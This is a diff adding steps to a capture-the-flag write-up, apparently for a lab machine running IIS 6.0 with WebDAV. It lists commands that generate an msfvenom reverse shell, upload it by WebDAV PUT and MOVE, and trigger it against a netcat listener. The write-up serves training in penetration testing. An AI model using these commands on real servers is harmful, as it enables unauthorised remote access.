@@ -36,14 +36,49 @@ Directory fuzzing:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a16434ff-a8b8-4fa4-98b3-ada15e1356a3)
 
+The server is a IIS httpd 6.0 server, and it's using **WebDAV** extension:
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0c3e5ae0-216e-4315-a416-81bac7972e2d)
 
+Check the allowed HTTP methods: `davtest --url http://10.10.10.15`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ed156ba0-61f4-4c6b-b74a-0d1eb796979b)
 
 
 ## Exploitation & Gaining Access
 
 ### Method 1: 
+Generate a reverse shell with msfvenom:
 
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > shell.aspx
+
+mv shell.aspx shell.txt
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03d4a892-0847-4152-9540-70b82ce26b5f)
+
+Upload it using curl with PUT method, and rename it back to the original file type aspx using curl with MOVE option:
+
+```
+curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
+
+curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt' 
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b2ef3cc0-7d3c-41b9-aa22-768d296ff1a6)
+
+```
+# Start netcat listener:
+nc -nvlp 4444
+
+# Trigger the revershell using curl, or opening on the browser:
+curl http://10.10.10.15/shell.aspx
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3a072777-cb2a-4d6d-b136-0577b7f52fb0)
+
+We got the shell, and there's no privilege to read user.txt flag.
 
 
 ## Privilege Escalation
